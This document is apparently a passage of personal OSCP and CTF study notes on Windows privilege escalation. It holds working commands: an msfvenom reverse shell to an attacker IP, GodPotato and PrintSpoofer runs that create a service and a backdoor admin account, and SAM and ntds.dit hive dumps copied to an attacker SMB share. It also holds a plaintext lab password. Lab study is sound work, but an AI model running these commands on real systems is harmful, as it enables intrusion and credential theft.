<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Windows</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Windows</h1><br/><p><h1>Screenshot for Points</h1></p><p>ipconfig</p><p>hostname</p><p>whoami</p><p>type C:\Administrator\Desktop\proof.txt</p><p>type C:\PATH\local.txt</p><p></p><p><h2>AD Set MS01 &amp; MS02</h2></p><p>Don&#39;t think think there&#39;s local.txt for AD Set, but check anyways?</p><p></p><p>Still get screenshot of interactive shell as SYSTEM, just to be safe. Idk if it&#39;s needed.</p><p></p><p>ipconfig</p><p>hostname</p><p>whoami</p><p>(Check for flags?)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Try Domain Admin Creds with impacket-psexec if you haven&#39;t gotten RCE as SYSTEM on both yet. (Domain Admins can sometimes get the same privs as a Local Admin)</p><p></p><p><h1>More Complete List</h1></p><p>[OSCP 137-155]</p><p>Some Enum omitted from CherryTree notes (useful for Post-Exploit as well!)</p><p></p><p><span style="color:#ff0000;">Different hosts may reuse the same password for</span> the default local <span style="color:#3584e4;">Administrator</span> acct.</p><p></p><p><a name="Cert Dialog"></a><h1>Certificate Dialog Vulnerability</h1></p><p>[Win 46-47]</p><p><span style="color:#ff0000;">Requires GUI</span> access (i.e RDP or VNC).</p><p></p><p>I believe this affects <span style="color:#ff0000;">any system &lt; Nov 2019 </span>(unless there&#39;s a corresponding Hotfix installed).</p><p></p><p><a href="file:///home/asura/git/win_PrivEsc_Cert/">CVE-2019-1388</a>		OR 	Download	From <a href="https://github.com/jas502n/CVE-2019-1388.git">https://github.com/jas502n/CVE-2019-1388.git</a></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: 1 time no URL was appearing for Verisign. Opening IE on target showed msg “Internet Explorer Enhanced Security Configuration is enabled.” Was this interfering with the PrivEsc?</p><p></p><p><a name="GodPotato"></a><h1>GodPotato (SeImpersonatePrivilege)</h1></p><p>Need <strong>SeImpersonatePrivilege</strong></p><p></p><p><em>.\GodPotato.exe -cmd “powershell -enc ENCODED”</em></p><p></p><p>Simplest method for Shell as SYSTEM, but alternative methods [OSCP 200-201]</p><p>Works on any version?</p><p></p><p>Normally can spawn PS Reverse Shell (as seen above). When that doesn&#39;t work, can normally create a new Local Admin which can be used with impacket-psexec (etc).</p><p>Once, output showed that I create a Local Admin, but it was treated like a normal user w/o any RCE privs (etc). Had to create a <a href="PrivEsc--Windows_9.html#Create SVC">SVC</a> to get SYSTEM shell.</p><p></p><p><h2>Troubleshooting</h2></p><p></p><p>Try <span style="color:#ff0000;">Re-running payload</span> a couple times after <span style="color:#ff0000;">verifying you made the correct iptables</span> <span style="color:#ff0000;">rule</span> &amp; are <span style="color:#ff0000;">using correct payload</span>!</p><p></p><p><h3>Architecture (32-Bit vs 64-Bit)</h3></p><p><span style="color:#ff0000;">Unsure if this works on x86 (32-bit) </span>Windows. To be safe, upgrade to 64-Bit shell if possible. (May work regardless? idk)</p><p></p><p><span class="subheading">Verify Arch</span>: Ensure that the machine can run 64-Bit (x64) binaries with <strong>systeminfo</strong></p><p></p><p><span class="subheading">Upgrade Shell Arch</span>: Even if the system can run 64-Bit Binaries, your shell may still be 32-Bit. <a href="PrivEsc--Windows--RCE_33.html#PS Arch Upgrade">Upgrade</a> &amp; confirm the shell&#39;s architecture.</p><p></p><p><a name="Create SVC"></a><h3>SYSTEM Shell Disconnects Immediately (Create a SVC)</h3></p><p>Create an EXE binary with a stageless payload, but when invoked directly, nc immediately drops the shell after connection.</p><p></p><p><span class="subheading">Warning</span>: {Speculation} I believe that the msfvenom payload uses x86 arch by default, so it&#39;ll be universally compatible? I think in turn this spawned a 32-bit shell (unless coincidence)? Can manually specify arch with <em>-a</em>, or try <a href="PrivEsc--Windows--RCE_33.html#PS Arch Upgrade">upgrading</a>.</p><p></p><p><em>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 LPORT=1234 -f exe -o shell-1234.exe</em></p><p><em>.\GodPotato.exe -cmd &quot;.\shell-1234.exe&quot;</em>				(rlwrap nc shows connection was made but quits)</p><p></p><p><span class="subheading">Solution</span>: <span style="color:#ff0000;">Run this payload as a SVC</span> instead of directly invoking it through GodPotato! Specify <span style="color:#ff0000;">Absolute Path for EXE</span>!</p><p></p><p><em>.\GodPotato.exe -cmd &quot;sc create PrivSvc binPath=C:\users\public\shell-1234.exe&quot;</em><em></em></p><p><em>.\GodPotato.exe -cmd &quot;sc start PrivSvc&quot;</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: When creating Services using <strong>sc</strong>, the command must be run in CMD (Like GodPotato does) not PS</p><p></p><p><h3>[!] Cannot create process Win32Error:-2147024809</h3></p><p>Error using <em>.\GodPotato.exe -cmd “powershell -enc ENCODED”</em></p><p></p><p>Able to use <span style="color:#ff0000;">alt payload to create new Local Admin</span>, then elevate to <span style="color:#ff0000;">SYSTEM by using that acct with </span><em><span style="color:#ff0000;">impacket-psexec</span></em></p><p>May need to specify the local hostname for impacket-psexec, to ensure it doesn&#39;t think of it as a Domain Acct? idk, may do Local Acct by def?</p><p></p><p><em>.\GodPotato.exe -cmd &quot;net user dave2 password123! /add&quot;</em><em></em></p><p><em>.\GodPotato.exe -cmd &quot;net localgroup administrators dave2 /add&quot;</em></p><p></p><p><strong>{Atker}</strong> <em>impacket-psexec dave2:&#39;password123!&#39;@TARGET</em></p><p></p><p>Used this SYSTEM shell with powershell -enc ENCODED to get stable PS as SYSTEM</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: In rare cases, you may be unable to apply Admin Privs to the created user [CTF2 103-104]. Not sure why this is the case, but maybe there&#39;s some special config?</p><p></p><p><h3>Failed to impersonate security context token...</h3></p><p>[CTF2 102,104]</p><p>GodPotato usually works on every target that SweetPotato or PrintSpoofer does, &amp; more, but in this case<span style="color:#ff0000;"> PrintSpoofer worked when SweetPotato &amp; GodPotato didn&#39;t</span>.</p><p></p><p> SweetPotato says it can use PrintSpoofer, but it must still be different than the OG exploit. <span style="color:#ff0000;">Try PrintSpoofer if Potatoes fail</span>.</p><p></p><p><span class="subheading">Explanation</span>: GodPotato only works if DCOM is enabled, but the OG PrintSpoofer doesn&#39;t rely on DCOM.</p><p></p><p><span class="subheading">PrintSpoofer</span>: You can download pre-compiled binaries <a href="https://github.com/itm4n/PrintSpoofer">here</a>.</p><p></p><p>Try both the 32-Bit &amp; 64-Bit versions by running it with <strong>-h</strong> (help menu). If it outputs the help menu, you at least know it should be able to run.</p><p></p><p><span style="color:#ff0000;">Even though target was 64-Bit</span> &amp; in a 64-Bit shell, <span style="color:#ff0000;">only the 32-Bit version worked</span> for me. 32-Bit version seemed to work better in 64-Bit shell also (just a coincidence?)</p><p></p><p><em>.\PrintSpoofer32.exe -h</em></p><p></p><p><em>.\PrintSpoofer32.exe -c &quot;powershell -enc PAYLOAD&quot;</em></p><p></p><p><h3>Failed to created impersonated process with token...</h3></p><p>SweetPotato failed when launching PS with <strong>-p “powershell”</strong> but was able to use CMD with<strong> -p “cmd”</strong></p><p></p><p><span style="color:#ff0000;">Try using different scripts / commands</span> if one fails.</p><p></p><p><h1>Account Descriptions</h1></p><p>Accounts sometimes have sensitive info listed in fields like their Description. Check Local &amp; Domain Users (See AD section).</p><p></p><p><h2>Local Accounts</h2></p><p><em>Get-LocalUser | select *</em></p><p></p><p><h2>Domain Accounts</h2></p><p>[CTF2 109]</p><p>I believe I wrote it wrong in my Notes &amp; this is the correct syntax. Try that one if this doesn&#39;t work.</p><p></p><p><em>Get-ADUser -Properties description -Filter {samAccountName -like &#39;*&#39;} | select samAccountName,Name,Description |  FT</em></p><p></p><p><h1>Groups</h1></p><p>Several important groups (e.g those related to backups like <strong>Backup Operators</strong>).</p><p></p><p><h2>List Groups</h2></p><p><span style="color:#060f94;">★</span><h3>Nested Groups</h3></p><p>These won&#39;t appear on cursory readout of a user&#39;s group memberships, but <a href="PrivEsc--Windows--Active_Directory_10.html#Nested Groups">Nested Group</a> membership is inherited.</p><p></p><p><h3>Local Groups</h3></p><p>This will not show Domain Groups!</p><p></p><p><em>Get-LocalGroup</em></p><p></p><p><span class="subheading">Members</span>: <em>Get-LocalGroupMember Administrators</em></p><p></p><p><h3>Domain Groups</h3></p><p></p><p><h2>Backup Operators</h2></p><p>This typically means universal R/ access &amp; the ability to backup <a href="Misc_Attacks--Password_Attack_5.html#Registry Hashes">Hives</a>, which you can use to dump hashes.</p><p></p><p><strong><h3>Log on as a batch job</h3></strong><h3> Access Right</h3></p><p>By def, the following groups have this assigned: <strong>Administrators</strong>, <strong>Backup Operators</strong>, &amp; <strong>Performance Log Users</strong>.</p><p></p><p>This can be leveraged to schedule a task that executes a program as this user.</p><p></p><p>Maybe this can be done with Powershell&#39;s <a href="https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/register-scheduledtask?view=windowsserver2022-ps&viewFallbackFrom=win10-ps">Register-ScheduledTask</a>?</p><p></p><p><h1>Dangerous Privileges</h1></p><p>[OSCP 151]</p><p>Not exhaustive list? See <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#table">HackTricks Abusable Privs</a>, <a href="https://www.exploit-db.com/papers/42556">Exploit-DB Priv Explanation</a>,&amp; <a href="https://github.com/gtworek/Priv2Admin">More Complete Listing</a></p><p><ul><li><strong>SeBackupPrivilege</strong>: Copy Registry Hives locally or remotely (without needing RCE using impacket-reg)</li></ul></p><p><ul><li><strong>SeDebug</strong>: Mimikatz</li></ul></p><p><ul><li><strong>SeImpersonatePrivilege</strong>: <a href="PrivEsc--Windows_9.html#GodPotato">Potatoes</a></li></ul></p><p><ul><li><strong>SeLoadDriver</strong></li></ul></p><p><ul><li><strong>SeAssignPrimaryToken</strong></li></ul></p><p></p><p><a name="SeBackupPrivilege"></a><h2>SeBackupPrivilege || Backup Operators Group</h2></p><p><h3>Background</h3></p><p>Users with this priv (or access to Backup Operators Group) have full read access to the file system. This may include sensitive files like the <strong>SAM</strong> &amp; <strong>SYSTEM</strong> Registry files (&amp; <strong>NTDS.dit</strong> database in AD).</p><p></p><p>&quot;This privilege must bypass any ACL that the Administrator has placed in the  network.&quot; </p><p></p><p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators">Hacktricks</a> shows tools to assist in exploitation (I *think* it&#39;s this <a href="https://github.com/giuliano108/SeBackupPrivilege">Repo</a>), but can just LotL instead. See <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">HackingArticles</a>.</p><p></p><p><span style="color:#f66151;">★</span><span style="color:#060f94;text-decoration:underline;">Tip</span>: Sometimes local exploitation works, but remote exploitation doesn&#39;t.</p><p></p><p><h3>Local Exploitation</h3></p><p><a href="Misc_Attacks--Password_Attack_5.html#Registry Hashes">Dump Registry Hashes</a>. <span style="color:#ff0000;">Can also dump </span><strong><span style="color:#ff0000;">hklm\security</span></strong>.</p><p></p><p>Nav to a dir where you have R/W Access (e.g <strong>C:\Temp</strong>)</p><p></p><p><em>reg save hklm\sam .\SAM.bak</em><em></em></p><p><em>reg save hklm\system .\SYSTEM.bak</em></p><p></p><p>Transfer to Attacking Machine &amp; run-</p><p></p><p><em>impacket-secretsdump -sam SAM.bak -system SYSTEM.bak LOCAL</em></p><p></p><p><h3>Remote Exploitation</h3></p><p>[Win 49]</p><p>Doesn&#39;t require RCE! Works best to <span style="color:#ff0000;">manually copy each hive</span>, rather than automatically try downloading them all at once.</p><p></p><p>Start an SMB Server than output the files to it. (May need to use alternate method if Target requires SMB Auth before file transfers, like outputting to a local dir &amp; then transferring manually)</p><p></p><p><em>impacket-smbserver share . -smb2support</em></p><p></p><p><em>impacket-reg fusion.corp/jmurphy:&#39;u8WC3!kLsgw=#bRY&#39;@fusion.corp save -keyName &#39;HKLM\SAM&#39; -o &#39;\\10.2.11.116\share&#39;</em></p><p><em>impacket-reg fusion.corp/jmurphy:&#39;u8WC3!kLsgw=#bRY&#39;@fusion.corp save -keyName &#39;HKLM\SYSTEM&#39; -o &#39;\\10.2.11.116\share&#39;</em><em></em></p><p><em>impacket-reg fusion.corp/jmurphy:&#39;u8WC3!kLsgw=#bRY&#39;@fusion.corp save -keyName &#39;HKLM\SECURITY&#39; -o &#39;\\10.2.11.116\share&#39;</em></p><p></p><p><a name="DiskShadow Hives"></a><h3>Domain Controller Exploitation</h3></p><p>For Background &amp; alternate method using vshadow.exe, see [Win 126-127]</p><p></p><p>Leverage RCE on a DC to make a shadow copy of the FS.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The diskshadow cmds from HackTricks weren&#39;t working, so I mixed it with the cmds from HackingArticles.</p><p></p><p><span class="subheading">diskshadow script</span>: On Attacking machine, make a file containing the commands you&#39;ll pass to diskshadow &amp; convert it to a Windows format. For ex, my file contents were-</p><p></p><p>set verbose on</p><p>set metadata C:\Windows\Temp\meta.cab</p><p>set context persistent nowriters</p><p>begin backup</p><p>add volume C: alias cdrive</p><p>create</p><p>expose %cdrive% F:</p><p>end backup</p><p>exit</p><p></p><p><span class="subheading">Format diskshadow script</span>: <em>unix2dos diskshadow_rules.dsh</em></p><p></p><p><span class="subheading">Create Shadow Copy on Target</span>: In a dir where you&#39;ve R/W privs, run the following commands. It will create the dir <strong>.\ntds</strong> which contains <strong>ntds.dit</strong>.</p><p></p><p><em>diskshadow /s diskshadow_rules.dsh</em></p><p></p><p><em>robocopy /B F:\Windows\NTDS .\ntds ntds.dit</em></p><p></p><p><em>reg save hklm\system .\SYSTEM.bak</em></p><p></p><p><span class="subheading">Exfil to Attacker machine</span>: MAY have issues if trying to transfer the created <strong>.\ntds\</strong> dir. Worked better to just transfer the specific file itself, like-</p><p></p><p><em>copy .\ntds\ntds.dit \\10.2.11.116\share\ntds.dit</em></p><p></p><p><span class="subheading">Extract on Attacker machine</span>: <em>impacket-secretsdump -ntds ntds/ntds.dit -system SYSTEM.bak LOCAL</em></p><p></p><p><h1>★</h1><h1>Previous Commands</h1></p><p>Even if you get access to the Administrator account, <span style="color:#ff0000;">DON&#39;T IMMEDIATELY GO TO SYSTEM</span>! <span style="color:#ff0000;">View command history</span> using arrow keys &amp; other methods (e.g. Get-History, PS Transcription Files, etc)!</p><p></p><p><span style="color:#ff0000;">Repeat this for EVERY USER</span> you compromise!</p><p></p><p>Previous commands executed can help you pivot or reveal other useful Post-Exploitation information.</p><p></p><p><h2>Check for Additional Drives</h2></p><p>If the following returns multiple drives, you&#39;ll need to <span style="color:#ff0000;">repeat the File System Enumeratation for each</span>! My Enum commands only check 1 drive at a time. The following commands should be interchangable.</p><p></p><p><em>wmic logicaldisk get caption</em></p><p></p><p><em>wmic logicaldisk get name</em></p><p></p><p><a name="Sensitive Files"></a><h1>Sensitive Files</h1><h1></h1></p><p><h1></h1>Automated tools (e.g. Winpeas &amp; Hades) may miss things that you&#39;ll find by manually listing directory contents. They both missed config.php, even though Hades just runs <strong>Get-ChildItem</strong> (I can&#39;t explain why).</p><p></p><p><span style="color:#060f94;">★</span>To also <span style="color:#ff0000;">see hidden files with Get-ChildItem use </span><strong><span style="color:#ff0000;">-Force</span></strong>. To see <span style="text-decoration:underline;">only</span> hidden files use <strong>-Hidden</strong>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Can set Recursion Depth in PS by using Wildcards. For ex, to view Hidden Files in pwd &amp; the next 2 dirs-</p><p></p><p><em>Get-ChildItem -Path ~\*,~\*\*,~\*\*\*  -Force -File -ErrorAction SilentlyContinue</em><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><span style="color:#060f94;text-decoration:underline;">Tip</span>: <span style="color:#ff0000;">If you don&#39;t have R/ Perms</span> over a dir / file &amp; you run a cmd like <em>dir \setup</em>, you&#39;ll get <strong><span style="color:#ff0000;">File Not Found</span></strong>. That <span style="color:#ff0000;">doesn&#39;t mean it&#39;s empty</span>!<h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><a name="Password Manager"></a><h2>Password Managers</h2><h2></h2></p><p><h2></h2><h3>KeePass</h3></p><p>Client could be using other Passwd Managers, (e.g 1Password), but for <a href="Misc_Attacks--Password_Attack_5.html#KeePass">KeePass</a>-</p><p></p><p><em>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</em></p><p></p><p><span class="subheading">Loot</span>: Password Managers sometimes contain more valuable info than just passwords. <span style="color:#ff0000;">Look in all fields of an entry</span> (i.e the Notes &amp; Title). Easiest to see these if you Right Click → <strong>Edit Entry</strong></p><p></p><p>For ex, <span style="color:#ff0000;">could find SSH Key</span> in the Notes or a description of a host in the title!</p><p></p><p><strong>Edit Entry </strong> →  <strong>History</strong> <span style="color:#ff0000;">may contain prev creds</span> (&amp; these old passwds may still be used somewhere!)</p><p></p><p><h3>Firefox</h3></p><p>[CTF B 93]</p><p></p><p>Find examples with Google Dork <strong>intext:firefox_decrypt intitle:tryhackme</strong></p><p></p><p><a name="Backed up Hives"></a><h2>Registry Hives</h2><h2></h2></p><p><h2></h2>Hives may have been backed up somewhere on disk. Can <a href="Misc_Attacks--Password_Attack_5.html#Registry Hashes">extract hashes</a> from these hives. If in AD also look for <strong>ntds.dit</strong>!</p><p></p><p><span style="color:#f66151;text-decoration:underline;">IMPORTANT</span>: Normal Enum will miss hives in a hidden directory, or in an alternate drive. To check hidden directories, use PS command with <strong>-Force</strong>.</p><p></p><p>Use CMD command! In PS- <em>cmd /c “CODE”</em></p><p></p><p><strong><span style="color:#ff0000;">{CMD}</span></strong>  <em>cd C:\ &amp; dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK</em></p><p></p><p><strong><span style="color:#ff0000;">{CMD}</span></strong>  <em>cd C:\ &amp; dir /S /B SAM == SYSTEM == SECURITY == SAM.OLD == SYSTEM.OLD == SECURITY.OLD == SAM.BAK == SYSTEM.BAK</em> == SECURITY.BAK	 </p><p></p><p><h3>Less False Positives</h3></p><p><em>Get-ChildItem -Path C:\ -Include </em>SAM,SECURITY,SYSTEM,SAM.OLD,SECURITY.OLD,SYSTEM.OLD,SAM.BAK,SECURITY.BAK,SYSTEM.BAK  -File -Force -Recurse -ErrorAction SilentlyContinue</p><p></p><p><h3>Less False Negatives</h3></p><p><em>Get-ChildItem -Path C:\ -Include </em>SAM,SECURITY,SYSTEM,SAM.*,SECURITY.*,SYSTEM.*  -File -Recurse -Force -ErrorAction SilentlyContinue</p><p><h2></h2></p><p><h2>Config Files (XAMPP)</h2></p><p><span style="color:#ff0000;">List Root FS first</span> to ensure you know all the locations to look, could be &gt;1 (e.g <strong>C:\inetpub</strong>)</p><p></p><p>Maybe also check for things like SQL DB files? (MySQL is <strong>.sql</strong> I believe)</p><p></p><p>Auto-Checking doesn&#39;t replace <span style="color:#ff0000;">Manual Enum!</span></p><p></p><p><h3>Look for Interesting Files</h3></p><p><em>Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue</em><h1></h1></p><p><h1></h1><span style="color:#ffbe6f;"> </span><h1></h1></p><p><h1></h1><h3>List All Files</h3><h1></h1></p><p><h1></h1><em>Get-ChildItem -Path C:\inetpub -File -Recurse -ErrorAction SilentlyContinue</em><em></em></p><p><em></em> <h1></h1></p><p><h1></h1><h3>Manually Check </h3><h3>WebApp</h3><h3> Files</h3><h1></h1></p><p><h1></h1>May be additional info stored in <strong>.htdocs</strong>, <strong>.htpasswd</strong>, <strong>web.config</strong>, <strong>.php</strong> files (for ex), etc</p><p></p><p>For ex, <strong>web.config</strong> or a PHP file may contain the creds to connect to a SQL DB.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you find SQL Creds, enumerate ports &amp; processes. This can tell you the DBMS that is in use (e.g. Port 3306 indicates that it&#39;s probably MySQL).<h1></h1></p><p><h1></h1><span style="color:#ffbe6f;"> </span><h1></h1></p><p><h1></h1><h2>Checking User Files</h2><h1></h1></p><p><h1></h1>Re-run this after <a href="PrivEsc_8.html">PrivEsc</a> (May also need higher integrity shell to access other user&#39;s FS in some cases? RDP &amp; spawn elevated PS if possible. At least sometimes, <em>impacket-psexec</em> works fine).</p><p></p><p>If using <em>impacket-psexec</em>, all the following cmds work better via the <a href="PrivEsc--Windows_9.html#Stabilized PS">Stabilized PS</a></p><p></p><p><em>Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xml,*.xls,*.ps1,*.xlsx,*.doc,*.docx,*.ini,*.log,*.zip -File -Recurse -ErrorAction SilentlyContinue</em></p><p></p><p>powershell -c &quot;<em>Get-ChildItem -Path C:\Users\ -Include *.txt</em> -File -Recurse -ErrorAction SilentlyContinue&quot;</p><p></p><p>Note: Could also be<span style="color:#ff0000;"> interesting files or directories in Root FS</span>. Also check for some of these <span style="color:#ff0000;">file ext in \</span></p><p></p><p><h2>Recycle Bin</h2></p><p>[CTF B 187]</p><p></p><p>When files are “deleted” on a Windows machine, they&#39;re just unlinked, but a handle is kept in the Recycling Bin until the file is overwritten.</p><p></p><p>This makes file recovery very easy, unlike on Linux where there&#39;s no simple way to recover deleted files.</p><p></p><p>Each user&#39;s trash is stored in a directory named after their SID. You can check your SID with <strong>whoami /all</strong>.</p><p></p><p><em>Get-ChildItem -Path &#39;C:\$Recycle.Bin&#39; -Force -EA SilentlyContinue -Recurse</em></p><p></p><p><h3>Interacting with Files</h3></p><p>You need to use single quotes around the file path. <strong>evil-winrm</strong> has issues downloading files from the Recycling Bin, so you need to copy the files to an alternate directory before downloading them.</p><p></p><p><em>copy &#39;C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak&#39; C:\Users\Jareth\system.bak</em><em></em></p><p><em>download &#39;C:\Users\Jareth\system.bak&#39;</em></p><p></p><p><h2>Checking for Backup Files</h2><h2></h2></p><p><h2></h2><em>Get-ChildItem -Path C:\ -Include *.bak,*.old -File -Force -Recurse -ErrorAction SilentlyContinue</em></p><p></p><p><h2>Credential Files</h2><h2></h2></p><p><h2></h2>Search for common files used to <a href="PrivEsc--Windows_9.html#Saved Passwords">save passwords</a> (see this section for more info). For example,</p><p></p><p><em>Get-ChildItem -Path C:\ -Include SiteList.xml,unattend.xml,sysprep.xml -File -Force -Recurse -ErrorAction SilentlyContinue</em><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><h2></h2></p><p><h2></h2><a name="Windows' Grep"></a>Checking for Text in Files<h1></h1></p><p><h1></h1>Recursively Check Files</p><p></p><p><em>(Get-ChildItem C:\Users\ -Recurse | Select-String -Pattern &quot;NTLM&quot;) 2&gt;$nul</em></p><p></p><p>Check Specific File</p><p></p><p><em>Get-ChildItem \users\public\200_lines.txt | Select-String -Pattern &quot;NTLM&quot;</em></p><p></p><p><h3>Windows </h3><em><h3>head</h3></em><h3> Equivilant</h3></p><p>May help to “sample” a file, so you know what to grep for using ↑ aforementioned method.</p><p></p><p>Also possible to redirect output into file, or pipe into cmd like | Select-String -Pattern &quot;NTLM&quot;</p><p></p><p><em>Get-Content &quot;\Users\joe\Documents\fileMonitorBackup.log&quot; -TotalCount 2000</em></p><p></p><p><a name="PS Histories"></a><h2>PS Goldmine</h2><h2></h2></p><p><h2></h2>[OSCP 140-142]<h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2>★<span style="color:#ff0000;">Run from EACH Acct</span>. Espcially try high priv Accts, like <span style="color:#ff0000;">Built-in Administrator</span>!<h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><h3>History Files</h3><h3></h3></p><p><h3></h3>History is often cleared with <em>Clear-History</em>, but this  doesn&#39;t clear PSReadline which is often overlooked.</p><p></p><p>There are times where <strong>Get-History</strong> has commands not listed in the PS History file &amp; vice versa.</p><p></p><p><span style="color:#ff0000;">UNIQUE for each Acct</span>. Even if you&#39;re already SYSTEM, try logging in as each Acct &amp; checking their history (i.e to Pivot in AD).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The <strong>Get-PSReadlineOption</strong> module may not be installed by default  (unless the machine uses Windows 10).</p><p></p><p><em>Get-History																	</em>(Only shows in memory history for this Account&#39;s current session)</p><p><em></em></p><p><em>(Get-PSReadlineOption).HistorySavePath </em>			→ 		<em>type \path\file.txt</em><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><span class="subheading">List all User&#39;s History Files</span>: Ideally run as SYSTEM, otherwise you probably will only get the current user&#39;s history file (unless there&#39;s a special config).</p><p></p><p><em>Get-ChildItem -Path &#39;C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\&#39; -Filter &#39;ConsoleHost_history.txt&#39; -Recurse | </em><em></em></p><p><em>    ForEach-Object {</em><em></em></p><p><em>        Write-Host &quot;`n--- $($_.FullName) ---`n&quot;</em><em></em></p><p><em>        Get-Content $_.FullName</em><em></em></p><p><em>    }</em><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>PS Transcription Files</h3></p><p>If this is enabled, check History Files for references to path used to store Transcription Files. For ex-</p><p></p><p><em>Start-Transcript -Path “C:\Users\Public\ Transcripts\transcript01.txt”</em></p><p></p><p>Will store all PS in that log file up until the user enters <em>Stop-Transcript</em></p><p></p><p><h3>PS Script Block Logging</h3><h3></h3></p><p><h3></h3>[OSCP 141-142]</p><p>GUI &amp; Cli Methods (Idk if winpeas checks for this or not)</p><p></p><p><h2>Github Repos</h2></p><p>[CTF B 28 &amp; Wreath 132-134]</p><p></p><p>More on <a href="Recon_+_Services--WebApp_12.html#Github Public Repo">extracting info from Github Repo</a> in WebApp. <span style="color:#ff0000;">Sometimes must use WebApp method</span>, instead of below Local Github repo enum!</p><p></p><p>There could be more than 1 <strong>.git/</strong> on a host (Could even be nested in one another)</p><p></p><p><em>Get-ChildItem -Path C:\ -Include .git -Directory -Force -Recurse -ErrorAction SilentlyContinue</em></p><p></p><p><span style="color:#ff0000;">Must be inside the directory that contains</span> the <strong>.git/</strong> directory.</p><p>The same steps on CTF B pg 28 for the Linux machine also work on Windows, but may run into the following error-</p><p></p><p><h3>Troubleshooting- </h3><strong><h3>fatal: detected dubious ownership in repository</h3></strong></p><p>Windows wants you to have the SID of the repo owner, unless you add an exception. For ex, if <strong>\staging\ </strong>is the parent dir of <strong>.git\</strong></p><p></p><p><span class="subheading">Bypass/Exception</span>: <em>git config --global --add safe.directory C:/staging</em></p><p></p><p><span class="subheading">Determine Owner</span>: Can also determine owner, &amp; compromise that acct to gain access if you are unable to do the above bypass.</p><p><em> Get-LocalUser | Select-Object  name,sid</em></p><p> </p><p><h3>Recon</h3></p><p>Remember to <span style="color:#ff0000;">manually check interesting files</span>. For example, <strong>settings.php</strong> may not be referenced in the following commands, but could contain creds.</p><p><ol><li>git status    (See unpublished changes)</li></ol></p><p><ol><li>git log</li></ol></p><p><ol><li>git --no-pager diff BRANCH1 BRANCH2     (Using the hashsums from git log or manually as specified below!) Must specify commits that are only 1 change away from each other (i.e can&#39;t compare commit 1 &amp; commit 5)</li></ol></p><p><ol><li>git show </li></ol></p><p> </p><p><h3>★</h3><h3>Grep Sensitive Info</h3></p><p>Check through site files for <span style="color:#ff0000;">known usernames</span> &amp; for the target&#39;s <span style="color:#ff0000;">email domain</span>. You can also search for other interesting keywords (e.g. &quot;password&quot;).</p><p></p><p>This may uncover credentials associated with that user &amp; / or credential re-use. Try Credential Stuffing on the Web App &amp; using other services.</p><p></p><p>If you&#39;re desperate, you can try searching for vague things (e.g. <strong>@</strong> to find other usernames / emails that you missed)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Initial recon will likely show you an email address associated with commits. You can use that email domain &amp; any you find from WebApp Enumeration. There may be <span style="color:#ff0000;">&gt;1 email domain</span> in use!</p><p></p><p><span class="subheading">Grep on Windows</span>: The below commands are for Linux. Use the <a href="PrivEsc--Windows_9.html#Windows' Grep">Windows equivilant for grep</a> instead.</p><p></p><p><em>grep -Ri “bob” ./</em></p><p></p><p><em>grep -Ri &quot;@dog.htb&quot; ./</em></p><p></p><p><em>grep -Ri &quot;@&quot; ./</em> </p><p> </p><p><h3>Commit Hashes</h3></p><p>May have to manually list them. I believe they&#39;re in <strong>.git/objects/</strong></p><p></p><p><span class="subheading">Syntax</span>: The 1st 2 characters of the hash are the dir &amp; inside that is a file with the remanining characters. For ex,</p><p></p><p>commit <strong>c6bf001b02514f865f872996d20dc89da7b26287</strong> is in <strong>.git/objects/c6/bf001b02514f865f872996d20dc89da7b26287</strong></p><p>When referring to commits, ensure you&#39;re using the full hash! <span style="color:#ff0000;">May not be in order</span>!</p><p> </p><p><h2>SMB Shares </h2></p><p><em>net use</em><em></em></p><p><em>net share</em></p><p> <h1></h1></p><p><h1>Listening Ports</h1></p><p>Pay extra attention for <span style="color:#ff0000;">ports listening locally (i.e 127.0.0.1 </span>or <span style="color:#ff0000;">::1 </span>[IPv6]<span style="color:#ff0000;">) or on internal interface</span>. Nmap would&#39;ve missed these! May need to setup <a href="Pivoting_22.html#PF">PF</a> if target doesn&#39;t have additional interface for Ligolo-ng to reach these ports.</p><p><span style="color:#ff0000;">Connections from other hosts </span>could help you pivot to that target later. (e.g if a user connected via RDP, their hash will be stores in RAM &amp; can be dumped)</p><p></p><p><em>netstat -ano</em> </p><p><em>netstat -ano</em>b 	(Also shows name of SVC using the port in question, but requires higher privs)</p><p></p><p><h1>Host Information</h1></p><p><h2>Enumerate OS Version &amp; Hotfixes</h2></p><p>Exploits often say what year they affect (e.g GodPotato is up to {&amp; incl ?} 2022). Can determine the OS year based off of its build/ver (see <a 